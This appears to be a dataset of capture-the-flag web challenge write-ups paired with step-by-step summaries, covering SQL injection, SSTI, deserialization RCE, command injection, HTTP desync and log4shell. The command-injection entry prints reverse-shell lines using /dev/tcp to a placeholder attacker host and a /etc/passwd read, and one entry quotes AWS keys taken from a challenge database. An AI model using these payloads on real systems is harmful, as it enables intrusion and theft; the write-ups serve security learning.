"text","summary"
"Connecting to the web site will give you an authentication form with your IP printed on it. The title of the challenge seems related to the *User-Agent* string.

Analyzing the HTML source code, you can discover default credentials. Using them will print your User-Agent and an image.

The usage of `X-Forwarded-For: 127.0.0.1` doesn't alter the IP address.

The challenge talks about a database, so trying to alter the User-Agent during authentication will give you a SQL error. SQL injection is possible via User-Agent string.

So you have to leak the database name. The problem is that this query is an `INSERT` one, so you need to apply an appropriate approach. You can use an [error based approach via Updatexml().

The flag is composed with the database name.","Connect to the website and observe the authentication form with IP address.

Analyze the HTML source code to find default credentials.

Use default credentials to access the site, noting the User-Agent and image.

Attempt to alter the IP address using `X-Forwarded-For`, but observe no change.

Discover SQL injection possibility via User-Agent string.

Leak the database name using an error-based approach with `Updatexml()`.

Obtain the flag, which is composed of the database name.
"
"The web site is a form to upload files. Reading the challenge description, an XXE should be involved.

The form allows only PDF and DOCX files.

Uploading a DOCX file, you can notice that some information are shown. One of them is the number of pages.

DOCX files are archives of files where XML documents are present.

It is sufficient to create a DOCX and to alter the app.xml file, where the number of pages is stored.

Uploading the file in the web application will return the flag where the number of pages is shown.","Access the website and observe the form for uploading files, with XXE likely involved.

Note that the form only allows PDF and DOCX files.

Upload a DOCX file and observe the displayed information, including the number of pages.

Understand that DOCX files are archives containing XML documents.

Create a DOCX file and alter the app.xml file to manipulate the number of pages.

Upload the modified file to the web application and retrieve the flag displayed as the number of pages.
"
"Connecting to the web page will give you the following PHP source code.

[PHP code with various conditional statements that check user input and output different strings based on the input. Some strings include a flag variable that is concatenated with HTML code and displayed on the page.]

You have to satisfy all checks to print the flag.

For the last check you have to find two colliding MD5 strings. You can write your php script to generate the URL-encoded version of the original strings for which hexadecimal values are provided.

The script will give you the strings.

So you can craft the complete request.

The webpage will give you the flag.","Connect to the web page and view the provided PHP source code.

Understand that you need to satisfy all checks to obtain the flag.

Determine that you need to find two colliding MD5 strings for the last check.

Write a PHP script to generate the URL-encoded versions of the original strings with the given hexadecimal values.

Execute the script to obtain the colliding strings.

Craft a complete request with the colliding strings.

Submit the request to the webpage and receive the flag.
"
"This execise contains 2 Flags. The first one is just finding the form (wow, complicated), the second seems to be hidden in environment variables.

First, the author tried to upload a file with the `.tpl` extension and a random content they can identify. It triggers a `POST` to `/upload.php` and then redirects with `302 Found` to the `/index.php`, where the file content is displayed. They tried to reload the page, but the file content is always displayed, so it is persistent. Uploading the file a second time changes the output. Uploading a different file changes the content again.

Then the author tried to upload a valid PHP file, and here it starts to become interesting:
[PHP script: Display an alert with the current URL]
Becomes: `<!--?php echo ""<br--><script>alert(window.location.href)</script>"";`
[PHP script: Echo the result of 1+1]
Becomes: `<!--?php echo 1+1; </div-->`

In this writeup, the author experimented with uploading files to a PHP web application. They discovered that the uploaded content is persistent and displayed on the site. They also noticed that when uploading PHP code, the server modifies the output, converting PHP tags into HTML comments.

After some more experiments, the author found that `<div class=""test"">{7*7}</div>` became `<div class=""test"">49</div>`, which means that there exists a Server Side Template Injection (SSTI).

The following payload reveals some useful information:
[HTML payload: Displays environment variables and exposes files]

After analyzing the output, the author discovered the presence of the `smarty-4.0.1` PHP library, a template engine. They also found the `templates_c` folder containing some template files.

The template files are accessible on the server and can be downloaded by calling their file paths. The source code of PHP can be leaked with the payload:
[HTML payload: Executes a system command to display the contents of the `index.php` file]

By accident, this revealed the flag.

An alternative solution mentioned that the template engine might have some sort of environment variable that could be accessible.
","Upload a file with a `.tpl` extension and random content, triggering a `POST` to `/upload.php` and a `302 Found` redirect to `/index.php`.
Observe that the uploaded content is persistent and displayed on the site, and that uploading a new file changes the content.
Upload a valid PHP file and notice that the server modifies the output, converting PHP tags into HTML comments.
Discover a Server Side Template Injection (SSTI) by uploading a payload with an expression in curly braces.
Use an HTML payload to display environment variables and expose files, revealing the presence of the `smarty-4.0.1` PHP library and the `templates_c` folder.
Access and download the template files on the server by calling their file paths.
Use an HTML payload to execute a system command and display the contents of the `index.php` file, accidentally revealing the flag.
(Alternative) Explore the possibility of an accessible environment variable within the template engine.
"
"The website's homepage displays an ""Under Construction"" image.

## Exploring content

To explore the site, it was opened with ZAP Proxy.

At the root path `/`, there was nothing of interest.
The `/logout` and `/login` paths were also investigated.
The login path contained a form for submitting a username and password, but attempting to log in with `admin` as both the username and password was unsuccessful, displaying a message stating that the username and/or password were invalid.

A ""Forgot password"" link redirected to `/forgotpassword.html`.
This path has some JavaScript which is does not work:
[JavaScript snippet: Non-working error message function with commented database credentials]

The passwords from the database did not appear to be crackable with Hashcat, even after a 7-character brute force attempt.
SQL Injection seemed to be ineffective.

Other notable features of the page included the `JSESSIONID` cookie and a custom header `ETag`.
It seems to be interesting (reading on the MDN Web Docs). Spoiler: it is not.

Submitting a username from the database did not seem to have any effect.

Visiting the `/admin` and `/dashboard` paths resulted in HTTP 404 errors, displaying default Apache Tomcat error messages.

### Database

Upon examining the database, several schemas were discovered: `accounts`, `config`, `env`, `innodb`, `sys`, and `users`.

Within the `users` schema, the `data` table contained a flag. The `employees_login` table held `Emp_id`, `User_name`, and `Password` fields, with passwords hashed using SHA1. The `employees` table contained personal data about the employees, with all emails ending in `@dummy.com` and all birthdates set to `0000-00-00`.

In the `env` schema, the `git` table contained an OpenSSH private key.

The `config` schema's `aws_env` table held the following information: `user` as `s3user1`, `access_key` as `AKIAWSXCCGNYFS7NN2XU`, and `secret` as `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`.

Finally, within the `accounts` schema, the `employees_account` table listed `Emp_id`, `Username`, and `Account_number`.

### Amazon S3
The crdentials in the `aws_env` table can be used to access an Amazon S3 bucket with. Download is possible with AWS CLI (after `aws configure`): 
[aws command: Download the S3 bucket content]

It contains a tomcat log. After analyzing it, I saw another flag:
`23-Jun-2022 12:50:31.561 INFO [main] org.apache.catalina.core.AprLifecycleListener.lifecycleEvent APR capabilities: CTF{example_flag}`

After some more analyzing, I stumbled on this suspicious line:
`23-Jun-2022 12:50:31.551 ERROR [main] unable to pull update from github.com/cloudhopper-sec/app.git`

The repository is not accessible on GitHub. However, the account exists.

### GitHub Repository
GitHub repository can be cloned with the command:
[bash command: Set the custom SSH command to use the provided private SSH key when connecting to a remote server]

The SSH key is the one leaked from the database.

The repository contains the source code of the challenge including a Dockerfile.

### Apache Tomcat
The Tomcat servers version might be vulnerable to Remote Code Execution via a malicious `PUT` of a JSP (https://nvd.nist.gov/vuln/detail/CVE-2017-12617).

I tried it but the server is not vulnerable and forbids `PUT` requests.

## Code Review
The Java Servlet has `log4j` 2.14.1 as a dependency, which is vulnerable to Remote Code Execution via JNDI (Java Naming and Directory Interface).

Looking at the code, `ProfileServlet.java` logs the content of a `debug` Cookie value. This can be used to perform a log4shell attack. However, this is only possible if the user is logged in.
[JNDI payload]
[base64 encoded cookie]

In the Docker environment, the username and password are set to an empty string. However, this is not the case in production, maybe username or password are the flag. The user is identified by a SHA256 hash which is `SHA256(username + password)`.  The Database credentials don't work.

Tomcat does not use log4j so it is not vulnerable to malicious user input. Other libraries also don't use log4j.

## Exploiting log4j for the flag (after challenge for testing)
(Note: I was to lazy to write a beautiful Java code)
[Java code: RcePayload class that exploits log4j vulnerability, extracts credentials and flag, and sends them to a malicious server]
","Explore the site with ZAP Proxy, investigating various paths including `/`, `/logout`, `/login`, `/forgotpassword.html`, `/admin`, and `/dashboard`.
Examine the database, discovering several schemas, and obtain credentials and an OpenSSH private key.
Access an Amazon S3 bucket using the credentials from the `aws_env` table, and download the contents with the AWS CLI, finding a flag within a Tomcat log.
Clone the GitHub repository using the leaked private SSH key, and examine the source code of the challenge.
Investigate potential vulnerabilities in Apache Tomcat and the Java Servlet, discovering the vulnerable `log4j` dependency in `ProfileServlet.java`.
Attempt to exploit the log4j vulnerability, extracting credentials and the flag. (This step was performed after the challenge for testing purposes.)
"
"The app represents an airline website. You can
- Sign up with a username, password and airline ticket number
- Then sign in with the username and password
- After that, the flight info will be displayed as a static image (it does not seem to contain any usefull information though at first glance)

## Code Review
After downloading the offered code, I looked into the folder with the app. Some JavaScript files, our (fake) Flag (hurray! No guessing where I neet to search for) and the `package.json`. Ok, so I ran `npm install` and:
[bash command: Install npm packages and display audit report]

Wow, interesting! ""Code Execution through IIFE in node-serialize"", thats the description from the GitHub [security advisory](https://github.com/advisories/GHSA-q4v7-4rhw-9hqm). Damn, 9.8/10, this must be something. But what the heck is ""IIFE""? Okay Google ... or just opening the directly linked Wikipedia article in the advisory saves few clicks.
- https://developer.mozilla.org/en-US/docs/Glossary/IIFE
- https://en.wikipedia.org/wiki/Immediately_invoked_function_expression
After reading the advisory, it is clear thet `unserialize()` is the dangerous function here. Okay, let's remember that for later!

Were were we? Ah yes, review of the code. Ooops, just forgot about that and thought about this IIFE thing. But I have to calm down, you cant run before learning to crawl! So lets open it in VS Code and take a look. **No wait, a better idea!** Let's start the app first and see it in action. So lets try `npm run start` and ... rjagsdfgkafg!!!
[Error log: Permission denied while trying to start the app]

Yikes, it tried to open a priviliged port. Okay then let's try `npm run dev` (oh BTW, you can find scripts executed by the `npm run` command in the `scripts` section of the `package.json`). Ahh, failed again. So I looked into our `index.js` and spotted `const port = process.env.PORT || 80;`. Ah, makes sense, so the command would be `PORT=8080 npm run ...`. Yeahhhh, worked. Oh, and a new file named `storage.db` appeared in our directory. Okay, lets take a look at the app.

Nothing special. So lets go on. Interested in what the database looks like? Me too. So let's see what database engine seemed to be used (guess it was SQLite), open `package.json` again and ... yes it is SQLite as the dependecies say. Ok let's open the file in ""DB Browser for SQLite"".

Ok, nothing special at first. Although the `id` is weird. Just a ... double as a varchar?? Yeah, let's don't ask why exactly and just continue by reviewing the source now.

Firs't, let's open the `routes folder` which contains:
- index.js
- login.js
- logout.js
- signup.js

Pretty clear what they do, no spaghetti code, yay! So let's open index and ...
[JavaScript code snippet: Import cookie-parser, escape-html, and node-serialize, and set up a route for handling the root path]

Well, this was not what I expected. **RED ALERT!** `unserialize()`. So, the cookie is a serialized JS object which contains the user info. So if we control the cookie => BOOM! Remote Code execution. So let's see if we can execute a malicious payload ...

## Tried soloutions
First, let's try a basic Unserialize without Cookies and all that stuff. Just an additional javascript file with our tests:
[JavaScript code: Test basic serialization and unserialization with a simple payload]

And yeah, this works without a problem. So I can craft the malicious payload (at least I thought so).

The payload needs to read our flag file and return the result as the username, so that we can see it in our website. Remember, it's shown there already as ""Welcome xxx"".
[JavaScript code: Create a payload that reads the flag file and returns it as a username]

Aaaand ... oh, I made a stupid mistake!

### Problems

#### Payload was executed BEFORE serialization
Yeah, as the heading says, the payload was not serialized there and only executed before serializing. I mean makes sense because the function is executed. So I experimented a bit and looked up documentation.
https://github.com/luin/serialize

Oh, this is how functions can be executed. The function is encoded into the string and then gets executed.

### Solution
[JavaScript code: Craft a serialized payload with a function that reads the flag file and returns it as a username]

We can set the resulting payload shown in the console as our `session` Cookie.

## Attack real target
Attacking the sandbox gave me the flag without any problems

## Better solution (after solving)
[JavaScript code: Create a serialized payload using node-serialize, then modify it and unserialize it to get the flag]

Can serialize the payload istself without hand crafting.
","Explore the app, signing up, signing in, and viewing flight info.
Perform a code review, finding a security advisory related to ""Code Execution through IIFE in node-serialize"".
Investigate the `unserialize()` function as a potential vulnerability.
Examine the database structure and contents using ""DB Browser for SQLite"".
Review the source code, particularly the route handling files, and find where `unserialize()` is used.
Test basic serialization and unserialization with a simple payload in a separate JavaScript file.
Craft a malicious payload that reads the flag file and returns it as a username.
Set the resulting payload as the `session` cookie to execute the attack.
Successfully obtain the flag by attacking the sandbox.
After solving the challenge, create a better solution by serializing the payload using node-serialize, modifying it, and unserializing it to get the flag.
"
"The app is a page with a form which says ""Create user"". After entering a name and clicking on ""Ctrate"", it lists the created users with name and if they are admins.

The source code for the app is avaliable as a download for the challenge.

## Review
The app is a Node.js TypeScript app written with Next JS. The `auth.ts` file is the most interesting part. The code snippet shows that it simply stores the request body object into the database, as seen in the requests made to the API endpoint with the format `{""username"":""our-username""}`.

It just seems to store the body object into the database which is also seen in the requests made to API endpoint: `{""username"":""our-username""}`.

The shema file `shema.prism` shows, that there is a field `isAdmin` field in the `User` model, which is set to `false` by default.

By sending a custom request body where `isAdmin` is set to `true` we can reveal the flag.
","Explore the app, which allows creating users with a name and displays whether they are admins.
Download and review the source code, focusing on the `auth.ts` file and observing how the request body object is stored in the database.
Examine the `shema.prism` file, identifying the `isAdmin` field in the `User` model, which is set to false by default.
Send a custom request body with `isAdmin` set to `true` in order to reveal the flag.
"
"The website is a WordPresss site where some links are cickable and reveal 2 blog posts where you can comment (in one of them).

`?p=1` has a blog post page where you can comment. First, I tried to create a comment aaannnd ... nothing? Interestingly, the URL is now `http://01.linux.challenges.ctf.thefewchosen.com:51490/?p=1&unapproved=2&moderation-hash=11d64a466de22952e34eaae54f57abc3#comment-2`. Seems like comments need to be approved or something.

Then I tried XSS but it does not really seem to work. The `<script>` tags seem to be removed and sometimes the commen isn't even listed.

Then I decided to look more closely at the source code of the page. I downloaded it from the ""save all"" menu in the browser and look at it in an IDE.

Then I found something suspicious. Some JavaScript named `mec-frontend` and some settings for some sort of calendar?
[HTML code: mec-frontend JavaScript and calendar settings with various variables and properties]

This looked suspicious, especially because the challange was called ""Calendar"" and had ""Are online calendars trusty?"" as a description.

Also, 2 other lines with a `<link>` Tag seemed weird:
[HTML code: alternate oembed links]

Mec seems o relate to a WordPress Plugin ""Modern events calendar"" (https://webnus.net/modern-events-calendar/). The used version has 2 entries in the explort database:
- https://www.exploit-db.com/exploits/50084
- https://www.exploit-db.com/exploits/50082

The firs one seems to need authentication so it does not work in our case. But the second one did not seem to work, too.
","Explore the WordPress website, finding a blog post page where you can comment, but comments need approval.
Attempt XSS, but observe that it doesn't seem to work as `<script>` tags are removed and comments aren't listed.
Download the source code of the page and examine it in an IDE, finding suspicious JavaScript named `mec-frontend` and calendar settings.
Investigate the ""Modern Events Calendar"" WordPress plugin and its two entries in the exploit database.
Determine that the first exploit requires authentication, which doesn't apply to the current case, and the second exploit doesn't seem to work either.
"
"When opening the site, the following text appears: ""Command executed: ping -c 2 127.0.0.1""

The URL is `/index.php?host=127.0.0.1` which indicates that the IP or maybe more is controllable.

I tried to set `host=127.0.0.1;cat /etc/passwd` which showed the content of the `/etc/passwd` file. This measn we can control the command and inject our own.

I then tried to inject `127.0.0.1;bash -c bash -i >& /dev/tcp/<attack-ip-with-netcat-open>/<attacker-netcat-port> 0>&1` as URL encoded payload to open a reverse shell but it didn't work.

I then tried `127.0.0.1;ls .` but it returned only `index.php`. 

`127.0.0.1;echo $PWD` shows, that the directory is `/var/www/html`. 

By injecting `env` into the host parameter, the environment variables were displayed, but the flag was not found among them.

`127.0.0.1;ls /root` showed nothing.

I tried multiple attempts to open a reverse shell but it didn't work (for example I tried `bash -i >& /dev/tcp/<ATTACKER-IP>/<ATTACKER-PORT> 0>&1` but no luck).

Okay, seems that only a Webshell works.

My attempts to open a reverse shell broke the container because I modified the PHP file so I had to restart it.

Then I tried to serch for the flag with the payload `ls /`. This revealed a `flag.txt` file entry which I could read by calling `cat /flag.txt`
","Notice the URL is `/index.php?host=127.0.0.1`, indicating controllable IP or command.
Inject commands such as `cat /etc/passwd` to confirm command control.
Attempt to open a reverse shell but fail.
Try a webshell and restart the container if needed.
Search for the flag with the payload `ls /` and find the `flag.txt` file.
Read the flag by calling `cat /flag.txt`.
"
"The App consists only of a web page displaying ""I hope you loke robots!. Other paths do not work and they always display the same HTML with the `200 OK` status code.

Because the challenge is called ""Robots and Music"" and the text says ""I hope you like robots!"" I tried opening `robots.txt`, and it disallowed the path `/g00d_old_mus1c.php`.

Opening the page reveals the flag.
","Visit the web page, which displays ""I hope you like robots!"" and gives a 200 OK status code for all paths.
Check the `robots.txt` file due to the challenge name and the text on the web page.
Find the disallowed path `/g00d_old_mus1c.php` in the `robots.txt` file.
Open the `/g00d_old_mus1c.php` page to reveal the flag.
"
"Baby Eval is a Node app which has a path `/` which lists some information including the server source code. As seen in the code the information comes from the following function:
[JavaScript function: Create a directory object with keys and values, including the server source code]

The webpage is created here:
[JavaScript code: Process and evaluate the payload from the query string]

The goal was to get the flag. First I saw that the code can execute `eval` by entering a `payload` as the `GET` query parameter. I first did not see that the ReEx is a Blacklist, not a whitelist (stupid me), so many things don't work including calling functions because `(` and `)` are not allowed. Then I googled for a way to call a function without prenthesis. Found that JavaScript Template Literals can have tags, which are basically functions whose first parameter is a list of strings. This list contains the parts of the string, split by the injection variables (`${x}`).

To bypass the restriction, I used the JavaScript Template Literal syntax to call the `directory` function with the argument ""flag"" by submitting the following payload.

Because we don't have an injection variable, the argument of `directory` is just `[ ""flag"" ]`.
","Examine the Node app's source code provided on the `/` path.
Identify the function that creates a directory object with keys and values, including the server source code.
Recognize that the code can execute `eval` by entering a `payload` as a `GET` query parameter.
Realize that the ReEx is a blacklist, not a whitelist, which prevents calling functions with parentheses.
Research a way to call a function without parentheses and discover JavaScript Template Literals.
Craft a payload using JavaScript Template Literal syntax to bypass the restriction and call the `directory` function with the argument ""flag"".
"
"vsCAPTCHA is secured by a special CAPTCHA kind of thing written in TypeScript and Deno.
1. `b1` and `b2` are initialized with a random number from 0-500
2. app starts to listen to `POST` requests in `/captcha`
	1.  if Header `x-captcha-state` is set, it checks if body JSON value `solution` is equal to expected CAPTCHA
	2. expected CPATCHAs are stored in a Map `random JWT UUID` => expected
	3. If expeted value does not match `solution`, it returns and sets JWT field `failed` to `true`
	4. else it generates a new CPATCHA, stores it in the map of expected value
	5. You can get the flag if you have more than 1000 CAPTCHA solves

The CAPTCHA is generated with following code:
[TypeScript code: Generate two random numbers and create a CAPTCHA text]

Brute force
The shown CAPTCHA is only 6 random Digits max. Because `b1` and `b2` are only initialized at startup of the application, they never change. If we have at least 1 CAPTCHA image, it sould be possible to try out what `b1` and `b2` is and then we can brute force a new captcha by just trying out all remaining expected values because the range is really low (just maximum of 15 for `num1` and maximum of 7 for `num2`).

Pitfalls:
- The JWT success counter is reset to 0 if the old token is invalid
- the expiry was not not extended for failed solving attempts which makes brute force on the original server more complicated

The Python code didn't work at first because of multiple bugs. I worked them out and it worked on the local setup but not on the CTF server beacuse the connection had ~500 ms delay and the token was reset to early. Then I tried to refactor my code and limit the try range but this only broke the code.

Cracking the random generator state/predicting random numbers
Because the random range is so small and non cryptographically secure random numbers were used, it might be possible to predict them. But not sure how to approach that.
","Analyze the vsCAPTCHA implementation, which is secured by a custom CAPTCHA written in TypeScript and Deno.
Understand the CAPTCHA generation process and note that `b1` and `b2` are only initialized at startup and never change.
Attempt to brute force the CAPTCHA by trying all possible combinations of `num1` and `num2`, given the limited range.
Encounter pitfalls such as the JWT success counter resetting to 0 if the old token is invalid, and the expiry not being extended for failed solving attempts.
Attempt to fix the Python code, but face issues with the CTF server due to connection delays and token reset.
Consider an alternative approach of cracking the random generator state or predicting random numbers since the random range is small and non-cryptographically secure random numbers were used.
"
"Analyzing the HTML code of the page we can see that there is anything to authenticate there.

Analyzing the  PCAP file you can discover on packet #6 the existence of staff.html web page.

Connecting to it, you will discover the flag.
","Analyze the HTML code of the page, noting there is no authentication.

Examine the PCAP file and find packet #6, revealing the existence of the staff.html web page.

Connect to the staff.html web page to discover the flag.
"
"At this point, you can spot two interesting cookies.

Analyzing the capture, you can find two packets, regarding a JWT-related endpoint.

You can use JWT.io to craft a valid JWT.

Calling the endpoint with the JWT in the `Authorization` header will give you the flag.
","Identify two interesting cookies in the capture.

Find two packets related to a JWT-related endpoint.

Use JWT.io to craft a valid JWT.

Call the endpoint with the JWT in the `Authorization` header to obtain the flag.
"
"The authentication page discovered during the previous step is the following.

Analyzing the PCAP file some interesting packets can be found.

You have discovered that: a `/forgotpassword.html` page exists, a user of the system and the forgot password functionality uses two different fields for username and e-mail, with a JavaScript code to copy the value inserted into the input field.

As a consequence, it is sufficient to intercept the request and change the e-mail with one you control, leaving the discovered username.

[HTTP POST request sent to the ""/forgotpassword.html"" endpoint with some form data in the request body, including an email address, and a CSRF token.]

The server response will contain the flag.

","Analyze the PCAP file and find interesting packets.

Discover the `/forgotpassword.html` page, a system user, and the forgot password functionality using separate fields for username and email.

Intercept the request and change the email to one you control, while keeping the discovered username.

Send the modified HTTP POST request to the `/forgotpassword.html` endpoint with the changed form data.

Receive the server response containing the flag.
"
"Connecting to the web site, two interesting cookies are set.

Analyzing the PCAP file some POST requests passing `passcode` value can be found. 
Considering the SHA-1 algorithm discovered before in the cookie value and applying that algorithm to the wi-fi nonces captured, you will discover that `passcode` values are just the first 8 chars of the hashed `nonce` value.

The same process can be applied to your `nonce` in order to perform a POST request.

The server response will contain the flag.


","Connect to the website and observe two interesting cookies being set.

Analyze the PCAP file and find POST requests with a `passcode` value.

Identify that the `passcode` values are the first 8 characters of the hashed `nonce` value using the SHA-1 algorithm.

Apply the same process to your `nonce` and perform a POST request.

Receive the server response containing the flag.
"
"Analyzing the HTML code we can notice:

[HTML image tag that displays an image with the specified source URL, a query string appended containing the flag.]
","Analyze the HTML code.

Observe the image tag with the specified source URL and a query string containing the flag.
"
"Analyzing the HTML code we can notice:

[HTML code for an invisible image element that triggers an alert when clicked. The alert message is encoded using ASCII character codes.]

Using browser console to run the JavaScript will give you the flag.","Analyze the HTML code.

Notice the invisible image element that triggers an alert with an encoded message.

Use the browser console to run the JavaScript and obtain the flag.
"
"The target website contains a login form with a JavaScript check used to prevent the submission of long passwords.

JavaScript can be easily disabled from the browser (or a proxy tool can be used to intercept and repeat the request) in order to bypass this check.

Using a common password, i.e. `password`, will reveal the flag.","Visit the target website and locate the login form with a JavaScript check.

Disable JavaScript in the browser or use a proxy tool to intercept and repeat the request, bypassing the check.

Submit a common password like ""password"" to reveal the flag.
"
"The website allows you to upload and comment pictures of dogs.

There is an interesting endpoint at that contains a remote shell functionality, but it can't be used due to an `HTTP 502 Bad Gateway` error caused by the presence of `seccomp` filter, which prevents `execve`.

Several functionalities can be used only by authenticated users (i.e. `@login_required` annotations). There is an endpoint that can be used to create new users, but even this functionality requires the login.

A public functionality is the `<postid>` that can be used to insert a new comment under a picture.

The comment is inserted with a two-step procedure: the comment is inserted like a preview and showed into the webpage; the content of the comment is strictly validated and inserted into the database.

Analyzing the code for the first step, in the python script, an interesting line of code can be found into `get_comments` function.

The interesting line is the following.

[Python code that formats a comment string using the contents of a dictionary attribute ""self.dict"" and assigns it to a variable named ""fmt_cmt"".]

It seems that if you use a format string like `{rating}` into the comment text, then the content of `self.__dict__` can be printed.

Trying it, the following content will be printed into the preview webpage.

[HTML code containing an unordered list with class ""square"" and a Python dictionary nested within a string.]

This code can be abused to read secret data.

The following code can be used to access *globals* objects.

[Python expression that retrieves the global variables dictionary of the init method of the first element in the ""comments"" list of the ""rating"" dictionary.]

From the output you can spot user credentials.

So now you can authenticate into the system and create new users.

During the authentication, an interesting behavior can be spot. The `login` method uses the f-Strings functionality of Python 3, which is a very powerful formatting syntax and can be used to call methods.

[Python Flask route handler function for the ""login"" URL that accepts both GET and POST requests. It processes a login form, authenticates the user with the provided username and password, and redirects the user to the appropriate page based on the result of the login attempt.]

The interesting line is the following.

[Python code that returns a redirect to a specific URL, constructed by appending a query string with a welcome message containing user information to the base URL obtained from the request's host URL.]

The `get_user_info` method of the `User` class uses the `f()` method, instead of the `f""""` one, on the `username` field; this method is the legacy one of f-Strings Python 2 implementation. The library implemented the f-Strings functionality by using an `eval`.

[Python code that imports a custom module named ""fstring"" and defines a method named ""get_user_info"" that returns a formatted string using the instance variable ""self.username"".]

So you can create a new user with a malicious username that could trigger a RCE during the authentication. The malicious username is: `{open('/flag').read()}`.

Authenticating with this user, you will be redirect to the following an address that contains the flag in the URL.","Analyze the website and locate the interesting endpoint with remote shell functionality, which is blocked by an HTTP 502 error.

Investigate the `<postid>` functionality that allows inserting comments under a picture.

Discover a way to use format strings like `{rating}` in the comment text to print the contents of `self.__dict__`.

Use a code snippet to access global objects and spot user credentials, then authenticate and create new users.

Identify the interesting behavior in the `login` method and understand how f-Strings functionality can be exploited.

Create a new user with a malicious username, like `{open('/flag').read()}`, which triggers a remote code execution during authentication.

Authenticate with the malicious user to be redirected to an address containing the flag in the URL.
"
"With this web application you can submit a text content to a remote S3 bucket defining a GUID for the key and then retrieving the same text content via the GUID.

The functionality endpoint is `/files/`. The GUID can be set with `X-guid` HTTP header.

Analyzing the two given python files you can discover that no intended vulnerabilities are present.

Analyzing responses, you can discover some interesting HTTP headers: Server, Via, X-Server-By.

It seems that the architecture is composed by a proxy and different hosts behind it which run the application.

Considering the infrastructure, this seems to be an HTTP Desync Attack scenario.

The malicious HTTP request will be the following (the char between `Transfer-Encoding:` and `chunked` is `0x0b`).

[HTTP POST request with a payload consisting of two parts separated by a ""chunked"" encoding. The request is sent to the server and includes a ""x-guid"" header with a specific value.]

Which will give the following answer.

[HTTP response headers indicating that a resource was created successfully with a status code of 201.]

At this point it is sufficient to read the defined object which will return a POST request containing the flag.","Explore the web application and understand its functionality, which allows submitting and retrieving text content to and from a remote S3 bucket using a GUID.

Analyze the given Python files and notice no intended vulnerabilities.

Examine the HTTP headers in the responses and identify the possible architecture as a proxy with multiple hosts behind it.

Consider the possibility of an HTTP Desync Attack scenario.

Craft a malicious HTTP request using chunked encoding and a specific `x-guid` header value.

Observe the successful HTTP response indicating resource creation.

Retrieve the defined object, which returns a POST request containing the flag.
"
"The challenge will print a PHP source code.

[PHP code that checks if the 'start' parameter has been sent via GET request, and if not, displays the source code of the current file and exits. If 'start' is present in a POST request, it includes the corresponding file and echoes the value of a variable named '$secret'.]

You can craft a request like the following.

[HTTP POST request with specific headers and body content includes a parameter called ""start"" with a value of ""/var/www/html/flag.php"".]

The server responds with an HTTP 200 OK status code and returns a text/html response containing a flag.","Examine the PHP source code provided by the challenge.

Notice that the code checks for the presence of the `start` parameter in a POST request and includes the corresponding file while echoing the `$secret` variable.

Craft an HTTP POST request with specific headers and body content that includes the `start` parameter with a value of `/var/www/html/flag.php`.

Observe the server's response with an HTTP 200 OK status code, which contains the flag in the text/html response.
"
